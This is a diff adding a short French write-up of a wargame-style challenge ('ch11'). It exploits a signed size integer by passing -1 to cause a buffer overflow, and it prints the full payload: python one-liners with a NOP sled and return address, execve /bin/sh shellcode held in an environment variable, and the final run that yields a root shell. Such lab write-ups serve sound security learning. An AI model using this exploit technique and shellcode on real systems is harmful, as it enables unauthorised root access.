@@ -1,0 +1,10 @@
+On vois que la faille se trouve dans le int size, on peux donc lui passer -1 par exemple pour pouvoir ecrire ce que l'on veux et exploiter l'overflow.
+On voit apres quelques test que pour choisir l'adresse a laquelle jump il faudra ecrire :
+python -c 'print "\xff\xff\xff\xff" + "/" + "\x90"*140 + "ADRESSE"' > /tmp/file
+On met ensuite notre shellcode dans une variable d'environnement. Encore une fois le SHELLCODE vient de shellstorm.
+export SHELLCODE=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80 »’
+On recupere sont adresse grace au programme des exercices precedents.
+On remplace l'adresse.
+python -c 'print "\xff\xff\xff\xff" + "/" + "\x90"*140 + "\x2a\xfe\xff\xbf"' > /tmp/file
+./ch11 /tmp/file
+Et voila, nous sommes dans un shell root.
